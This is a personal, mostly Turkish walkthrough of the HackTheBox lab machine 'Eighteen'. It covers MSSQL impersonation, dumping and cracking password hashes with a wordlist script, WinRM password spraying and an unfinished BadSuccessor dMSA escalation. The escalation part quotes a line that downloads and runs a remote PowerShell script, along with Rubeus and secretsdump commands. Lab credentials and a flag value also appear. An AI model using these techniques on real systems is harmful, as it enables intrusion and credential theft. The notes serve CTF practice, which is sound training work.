
# Eighteen - Windows - Easy

## IP = `10.10.11.95`
## CRED: `kevin / iNa2we6haRj2gaw!`

----------------------------------------------------------------------------

# Enum


```bash
PORT     STATE SERVICE  REASON  VERSION

80/tcp   open  http     syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Welcome - eighteen.htb

1433/tcp open  ms-sql-s syn-ack Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2025-11-18T16:51:42+00:00; +7h00m01s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.95:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.11.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

5985/tcp open  http     syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

```

## ports: 80, 1433, 5985
## dc: `DC01.eighteen.htb`

----------------------------------------------------------------------------

# web - port80 - eighteen.htb
* vhost yok
* dir
```bash
➜  web feroxbuster --url http://eighteen.htb
                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://eighteen.htb/
 🚩  In-Scope Url          │ eighteen.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      199c http://eighteen.htb/admin => http://eighteen.htb/login
302      GET        5l       22w      189c http://eighteen.htb/logout => http://eighteen.htb/
200      GET       76l      145w     2421c http://eighteen.htb/register
200      GET       66l      121w     1961c http://eighteen.htb/login
200      GET       88l      203w     2822c http://eighteen.htb/features
200      GET      603l     1072w     9601c http://eighteen.htb/static/css/style.css
200      GET       74l      156w     2253c http://eighteen.htb/
302      GET        5l       22w      199c http://eighteen.htb/dashboard => http://eighteen.htb/login
200      GET       74l      156w     2253c http://eighteen.htb/%E2%80%8E
200      GET       74l      156w     2253c http://eighteen.htb/%D7%99%D7%9D
200      GET       74l      156w     2253c http://eighteen.htb/%E9%99%A4%E5%80%99%E9%80%89
200      GET       74l      156w     2253c http://eighteen.htb/%E9%99%A4%E6%8A%95%E7%A5%A8
200      GET       74l      156w     2253c http://eighteen.htb/%E4%BE%B5%E6%9D%83
400      GET        6l       26w      324c http://eighteen.htb/error%1F_log
200      GET       74l      156w     2253c http://eighteen.htb/%C5%B1%C4%BC
200      GET       74l      156w     2253c http://eighteen.htb/%CC%A8%C4%BC
200      GET       74l      156w     2253c http://eighteen.htb/%DD%BF%C4%BC
200      GET       74l      156w     2253c http://eighteen.htb/%C4%A3%C4%BC
200      GET       74l      156w     2253c http://eighteen.htb/%C4%BC
200      GET       74l      156w     2253c http://eighteen.htb/%E7%89%B9%E6%AE%8A
200      GET       74l      156w     2253c http://eighteen.htb/%E8%AE%A8%E8%AE%BA
[####################] - 2m     30006/30006   0s      found:21      errors:0      
[####################] - 2m     30000/30000   287/s   http://eighteen.htb/ 
```

## finance sitesi
* kevin / iNa2we6haRj2gaw! ile girmedi


----------------------------------------------------------------------------


# mssql - port 1433

## CRED: `kevin / iNa2we6haRj2gaw!`

## cli install ettim
```bash
python -m pip install mssql-cli --break-system-packages
```
error veriyo.

## nxc mssql
ilk başta -d ile domaimn yaptım ama bir de local auth dene dedi.
```bash
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth 
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
```

## modullere bak
```bash
nxc mssql -L                                                     
/home/menesay/.local/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.2.0)/charset_normalizer (2.0.7) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
LOW PRIVILEGE MODULES
[*] enum_impersonate          Enumerate users with impersonation privileges
[*] enum_logins               Enumerate SQL Server logins
[*] exec_on_link              Execute commands on a SQL Server linked server
[*] link_enable_xp            Enable or disable xp_cmdshell on a linked SQL server
[*] link_xpcmd                Run xp_cmdshell commands on a linked SQL server
[*] mssql_coerce              Execute arbitrary SQL commands on the target MSSQL server
[*] mssql_priv                Enumerate and exploit MSSQL privileges

HIGH PRIVILEGE MODULES (requires admin privs)
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_links                Enumerate linked SQL Servers and their login configurations.
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] test_connection           Pings a host
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
```

mssql_priv ile appdev'i impersonate edebiliyoruz
```bash
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -M mssql_priv       
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL_PRIV  10.10.11.95     1433   DC01             [*] kevin can impersonate: appdev
```

## veritabanı keşfi
```bash
# Tüm veritabanlarını listele
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -q "SELECT name FROM sys.databases"
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             name:master
MSSQL       10.10.11.95     1433   DC01             name:tempdb
MSSQL       10.10.11.95     1433   DC01             name:model
MSSQL       10.10.11.95     1433   DC01             name:msdb
MSSQL       10.10.11.95     1433   DC01             name:financial_planner

# Appdev olarak veritabanlarını listele
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -q "EXECUTE AS LOGIN = 'appdev'; SELECT name FROM sys.databases"
```

## tablo listele

burada kendi adıma göremiyorum ama appdev adına görebiliyorum.
```bash
mssql nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -q "EXECUTE AS LOGIN = 'appdev'; SELECT TABLE_NAME FROM financial_planner.INFORMATION_SCHEMA.TABLES"
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:users
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:incomes
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:expenses
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:allocations
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:analytics
MSSQL       10.10.11.95     1433   DC01             TABLE_NAME:visits
```

## select * from table
```bash
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth -q "EXECUTE AS LOGIN = 'appdev'; SELECT * FROM financial_planner.dbo.users"
```
users
```bash
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             id:1002
MSSQL       10.10.11.95     1433   DC01             full_name:admin
MSSQL       10.10.11.95     1433   DC01             username:admin
MSSQL       10.10.11.95     1433   DC01             email:admin@eighteen.htb
MSSQL       10.10.11.95     1433   DC01             password_hash:pbkdf2:sha256:600000$WO5GLYRaiLYDCrkW$1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1
MSSQL       10.10.11.95     1433   DC01             is_admin:1
MSSQL       10.10.11.95     1433   DC01             created_at:2025-10-29 05:39:03

MSSQL       10.10.11.95     1433   DC01             id:1021
MSSQL       10.10.11.95     1433   DC01             full_name:re
MSSQL       10.10.11.95     1433   DC01             username:re
MSSQL       10.10.11.95     1433   DC01             email:re@re.re
MSSQL       10.10.11.95     1433   DC01             password_hash:pbkdf2:sha256:600000$5D8Z9xh77jnTFHJY$5dcf50c62bc6b41de690feef53a09a4758131d544c6658f90838aacbc507643c
MSSQL       10.10.11.95     1433   DC01             is_admin:1
MSSQL       10.10.11.95     1433   DC01             created_at:2025-11-18 09:20:22

MSSQL       10.10.11.95     1433   DC01             id:1022
MSSQL       10.10.11.95     1433   DC01             full_name:Alex Williams
MSSQL       10.10.11.95     1433   DC01             username:Alex
MSSQL       10.10.11.95     1433   DC01             email:alex@mail.com
MSSQL       10.10.11.95     1433   DC01             password_hash:pbkdf2:sha256:600000$GppA79jqCCp4SRuZ$ba69a59a7a335e02a20f4da4c8849f823e32b063acfed14bf00288853f836b41

MSSQL       10.10.11.95     1433   DC01             is_admin:0
MSSQL       10.10.11.95     1433   DC01             created_at:2025-11-18 09:30:02
MSSQL       10.10.11.95     1433   DC01             id:1023
MSSQL       10.10.11.95     1433   DC01             full_name:ozozuz
MSSQL       10.10.11.95     1433   DC01             username:ozozuz
MSSQL       10.10.11.95     1433   DC01             email:ozozuz@ozozuz.com
MSSQL       10.10.11.95     1433   DC01             password_hash:pbkdf2:sha256:600000$iuYTRUS1q8EkAbnH$253c3088cb366ec00ef871908a1a5931aac1d527a903afe836306a08e0084f34


MSSQL       10.10.11.95     1433   DC01             is_admin:1
MSSQL       10.10.11.95     1433   DC01             created_at:2025-11-18 09:30:57
MSSQL       10.10.11.95     1433   DC01             id:1026
MSSQL       10.10.11.95     1433   DC01             full_name:test
MSSQL       10.10.11.95     1433   DC01             username:test
MSSQL       10.10.11.95     1433   DC01             email:test@test.com
MSSQL       10.10.11.95     1433   DC01             password_hash:pbkdf2:sha256:600000$xHzOkZg1VxTvKtrf$8aeb2ac20e9dcde632364bfadeb05ad38181b35a69d7f3ec0d7a1640aaa5f03d
MSSQL       10.10.11.95     1433   DC01             is_admin:0
MSSQL       10.10.11.95     1433   DC01             created_at:2025-11-18 09:38:05

```

# usernames: `admin`,`re`, `Alex`
# fullnames: `Alex Williams` sadece bir htb userının ismiymiş sonradan fark ettim:(

admin hash
`pbkdf2:sha256:600000$WO5GLYRaiLYDCrkW$1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1`

## hash cracking - admin
> https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256


## format list
```bash
john --list=format-tests --format=pbkdf2-hmac-sha256
# örnek 1 tane
PBKDF2-HMAC-SHA256	46	$8$6NHinlEjiwvb5J$RjC.H.ydVb34wDLqJvfjyG1ubxYKpfXqv.Ry9mtrNBY	password
```

example ciphertext:`$pbkdf2-sha256$1000$b1dWS2dab3dKQWhPSUg3cg$UY9j5wlyxtsJqhDKTqua8Q3fMp0ojc2pOnErzr8ntLE`
bizimkini de adam edelim:
$600000$WO5GLYRaiLYDCrkW$1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1


```bash
john --format=PBKDF2-HMAC-SHA256 admin.hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

john ile olmadı bi de hashcat bakalım

````bash
# Hash'i hashcat formatına çevir
echo 'sha256:600000:WO5GLYRaiLYDCrkW:1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1' > admin.hash.txt

hashcat -m 10900 admin.hash.txt /usr/share/wordlists/rockyou.txt --force
```
bu da gpu sorunu olduğu için çalışmıyor.

kafayı yicem!!

bak şimdi:
$600000$WO5GLYRaiLYDCrkW$1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1
denicez:
1) son kısım base64lü hali: $600000$WO5GLYRaiLYDCrkW$Hy8Jb1ii3TSZ/uBdw6gMER4Jg55fcOURulBnbbxj3fE=
olmadı
2) son ve sondan 1 önceki yer base64lü
$600000$V081R0xZUmFpTFlEQ3JrVw==$Hy8Jb1ii3TSZ/uBdw6gMER4Jg55fcOURulBnbbxj3fE=
ama ortası zaten SALT mal!
neyse yinede

3) eşittir yok:
$600000$V081R0xZUmFpTFlEQ3JrVw$Hy8Jb1ii3TSZ/uBdw6gMER4Jg55fcOURulBnbbxj3fE


## ai eşşekten yardım ile

admin hash
`pbkdf2:sha256:600000$WO5GLYRaiLYDCrkW$1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1`
```python
#!/usr/bin/env python3
import hashlib
import gzip
from multiprocessing import Pool, cpu_count

def check_password(args):
    password, salt, iterations, target_hash = args
    try:
        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
        if computed.hex() == target_hash:
            return password.decode('utf-8', errors='ignore')
    except:
        pass
    return None

# Hash components
salt = "WO5GLYRaiLYDCrkW"
iterations = 600000
target_hash = "1f2f096f58a2dd3499fee05dc3a80c111e09839e5f70e511ba50676dbc63ddf1"

# Run against rockyou.txt with multiprocessing
def load_passwords():
    """Load passwords from rockyou.txt"""
    wordlist = '/usr/share/wordlists/rockyou.txt'
    try:
        # Try gzipped version first
        with gzip.open(wordlist + '.gz', 'rb') as f:
            for line in f:
                yield line.strip()
    except FileNotFoundError:
        # Try plain text version
        with open(wordlist, 'rb') as f:
            for line in f:
                yield line.strip()

def crack_hash():
    """Crack the hash using multiprocessing"""
    print(f"[*] Starting password cracking with {cpu_count()} CPU cores")
    print(f"[*] Salt: {salt}")
    print(f"[*] Iterations: {iterations}")
    print(f"[*] Target hash: {target_hash}")
    print(f"[*] Loading rockyou.txt...\n")
    
    # Prepare arguments for multiprocessing
    passwords = load_passwords()
    args = ((pwd, salt, iterations, target_hash) for pwd in passwords)
    
    # Use multiprocessing pool
    with Pool(cpu_count()) as pool:
        count = 0
        for result in pool.imap_unordered(check_password, args, chunksize=1000):
            count += 1
            if count % 100000 == 0:
                print(f"\r[*] Tried {count:,} passwords...", end='', flush=True)
            
            if result:
                print(f"\n\n[+] PASSWORD FOUND: {result}")
                print(f"[+] Attempts: {count:,}")
                pool.terminate()
                return result
    
    print("\n[-] Password not found in wordlist")
    return None

if __name__ == "__main__":
    crack_hash()
```


iloveyou1

alex: pbkdf2:sha256:600000$GppA79jqCCp4SRuZ$ba69a59a7a335e02a20f4da4c8849f823e32b063acfed14bf00288853f836b41


mola!


yeni admin hash

`pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`


## gemini pro python script ile
```bash
mssql python3 crack3.py                                  
[*] Hash Kırma İşlemi Başlatıldı
[*] Algoritma: PBKDF2-HMAC-SHA256
[*] İterasyon Sayısı: 600,000
[*] Salt: AMtzteQIG7yAbZIa
[*] Hedef Hash: 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
[*] Sözlük Dosyası: /usr/share/wordlists/rockyou.txt


========================================
[+] ŞİFRE BULUNDU!
[+] Şifre: iloveyou1
[*] Toplam deneme sayısı: 234
[*] Geçen süre: 49.73 saniye
========================================

```

## CRED: `admin:iloveyou1`
web girdi. bişi yok >:(



mssql ile ridbrute yapılıyormuş!
```bash
nxc mssql $IP -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.10.11.95     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.10.11.95     1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.10.11.95     1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.10.11.95     1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.10.11.95     1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.10.11.95     1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.10.11.95     1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.10.11.95     1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.10.11.95     1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.10.11.95     1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.10.11.95     1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.10.11.95     1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.10.11.95     1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.10.11.95     1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.10.11.95     1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.10.11.95     1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.10.11.95     1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.10.11.95     1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.10.11.95     1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.10.11.95     1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.10.11.95     1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.10.11.95     1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.10.11.95     1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.10.11.95     1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.10.11.95     1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.10.11.95     1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.10.11.95     1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.10.11.95     1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.10.11.95     1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.10.11.95     1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.10.11.95     1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.10.11.95     1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.10.11.95     1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.10.11.95     1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.10.11.95     1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.10.11.95     1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.10.11.95     1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.10.11.95     1433   DC01             1612: EIGHTEEN\dave.green
```

## userlist
```bash
DC01$
DnsAdmins
DnsUpdateProxy
mssqlsvc
SQLServer2005SQLBrowserUser$DC01
HR
IT
Finance
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```
şimdi bu adamlardan biri admin olabilir ve aynı passwordu winrm'de kullanmış olabilir.

god damn mnatıklı! yani böyle SHIT yeah!
```bash
nxc winrm $IP -u users.txt -p "iloveyou1"  
WINRM       10.10.11.95     5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```
admin yetkisi de var :)

## CRED:`adam.scott:iloveyou1`

----------------------------------------------------------------------------

# Web - admin
## CRED: `admin:iloveyou1`
bişi yokkkkk! kafayı yicem.


----------------------------------------------------------------------------


# WinRM
* kevin / iNa2we6haRj2gaw! ile girmedi
* admin / iloveyou1 ile girmedi

## CRED: `adam.scott:iloveyou1`

# user.txt : `7d12a5dab7fae826663f98b822a87860`

şimdi cve arıcam. bu hackthebox'ta hiç bi zaman klasik işler olmuyor. kesin en son çıkan bir cve vardır.


hint kaynağı:
* luemell sec reposundaki toolu
* yeni bir cve
* tarlogic kaynağı


cat C:\Users\Administrator\Desktop\root.txt

badsuccessor
> https://github.com/akamai/BadSuccessor/tree/main
bunun çıktısına göre:
etkilenen OU
```bash
Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

```bash
./BadSuccessor.exe find

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec


[*] OUs you have write access to:
    -> OU=Domain Controllers,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll
    -> OU=Staff,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

bizim adamın:
CN=adam.scott,OU=Staff,DC=eighteen,DC=htb


```bash
/BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa adam_dmsa -targetUser "CN=adam.scott,OU=Staff,DC=eighteen,DC=htb" -dnshostname adam_dmsa -user adam.scott -dc-ip 10.10.11.95

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=adam.scott,OU=Staff,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'adam_dmsa' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=adam.scott,OU=Staff,DC=eighteen,DC=htb' (DC: 10.10.11.95)

[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
    -> Step 1: Find luid of krbtgt ticket
     Rubeus:      .\Rubeus.exe triage
     Kerbeus BOF: krb_triage BOF

    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.
     Rubeus:      .\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
     Kerbeus BOF: krb_dump /luid:<luid>

    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 )
    Rubeus:      .\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:adam_dmsa$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap
```

```bash
.\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x3a4913

 ---------------------------------------------------------------------------------------
 | LUID     | UserName                  | Service             | EndTime                |
 ---------------------------------------------------------------------------------------
 | 0x3a4913 | adam.scott @ EIGHTEEN.HTB | krbtgt/eighteen.htb | 11/19/2025 11:38:27 PM |
 ---------------------------------------------------------------------------------------
```


mola!!



denilen lanet lummelsec ps1 bu işte
> https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1
```bash
cat BadSuccessor.ps1
<#
BadSuccessor checks for prerequisits and attack abuse
Research: https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
Original Script: https://github.com/akamai/BadSuccessor/blob/main/Get-BadSuccessorOUPermissions.ps1
Usage:

runas /user:evilcorp.local\lowpriv /netonly powershell
iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/refs/heads/main/tools/ActiveDirectory/BadSuccessor.ps1")
BadSuccessor -mode check -Domain evilcorp.local
BadSuccessor -mode exploit -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -Name "bad_DMSA" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator" -domain "evilcorp.local"


.\Rubeus.exe tgtdeleg /nowrap
copy ticket
.\Rubeus.exe asktgs /targetuser:bad_dmsa$ /service:krbtgt/evilcorp.local /opsec /dmsa /nowrap /ptt /ticket:<paste ticket> /outfile:ticket.kirbi

then either request a tgs for a desired service as our targeted user (Administrator in that case):
.\Rubeus.exe asktgs /user:bad_dmsa$ /service:cifs/dc2025.evilcorp.local /opsec /dmsa /nowrap /ptt /ticket:doIF4

or convert to ccache file and proceed e.g. with impacket
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache impacket-secretsdump evilcorp.local/bad_dmsa\$@dc2025.evilcorp.local -k -no-pass -just-dc-ntlm



BadSuccessor -Mode GetThemHashes -Domain evilcorp.local -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator"
Will automagically do all the sweet stuff for you:
Create a dmsa per user
Set the msDS-ManagedAccountPrecededByLink property accordinly
Fetch them hashes via Rubeus
Delete the dmsas
#>
```


./BadSuccessor -mode check -Domain eighteen.htb

geçen exe:
/BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa adam_dmsa -targetUser "CN=adam.scott,OU=Staff,DC=eighteen,DC=htb" -dnshostname adam_dmsa -user adam.scott -dc-ip 10.10.11.95


bu ps1
BadSuccessor -mode exploit -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -Name "fuckdmsa" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator" -domain "eighteen.htb"

hash işini de yapıyotmul
BadSuccessor -Mode GetThemHashes -Domain evilcorp.local -Path "OU=BadSuccessor,DC=evilcorp,DC=local" -DelegatedAdmin "lowpriv" -DelegateTarget "Administrator"

nedense ps1 çalışmıyor site ile exeye çevirelim
> https://ps2exe.azurewebsites.net/


exe için:
```bash
./bs.exe -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "fuckdmsa" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"


./bs.exe -Mode GetThemHashes -Domain eighteen.htb -Path "OU=Staff,DC=eighteen,DC=htb" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator"
```

output vermiyor. en iyisi proxychain açıp daha safe area'da yapmak.
yeterrrrrrrrrrrrrrrrrrrrrr

----------------------------------------------------------------------------

